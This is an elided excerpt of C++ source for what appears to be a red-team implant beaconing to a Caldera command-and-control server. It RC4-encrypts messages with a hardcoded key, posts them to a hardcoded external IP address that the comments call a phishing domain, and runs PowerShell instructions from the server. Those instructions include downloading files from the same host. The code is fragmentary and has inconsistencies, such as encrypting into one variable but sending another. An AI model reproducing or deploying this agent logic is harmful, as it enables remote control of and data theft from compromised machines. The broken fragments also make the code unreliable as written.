...
int main()
{
    ...
    while (true)
    {
        ...
        // Use rc4 encryption to encrypt traffic sent to caldera.

        /*To make sure that Caldera receives the exact same thing correctly
        we go to contact_*py files in Caldera to modify that code/*/

        char* encryptedmsg = (char*)RC4((char*)"RedTeam", (unsigned char*)msg.dump().c_str(), msg.dump().length());
        printf("Our Encoded Msg: %s\n", encodedmsg);

        //WinInet API functions HINTERNET handles sending the encoded and encrypted data to my phishing domain
         
        HINTERNET hSession = SendRequest("34.244.125.251", 80, "/beacon", "POST", encodedmsg);
        if (hSession)
        {
        ...
        for (int i = 0; i < res["instructions"].length(); i++)
        {
            ...
            if (executor == "psh")
            {
                ...
                if (fullcmd.rfind("download ", 0) == 0)
                {
                    ...
                    string FullURL = "34.244.125.251" + filename;
            ...
            hSession = SendRequest("34.244.125.251", 80, "/beacon", "POST", encodedmsg);
            if (hSession)
            {
                printf("Data has been sent successfully\n");
            }
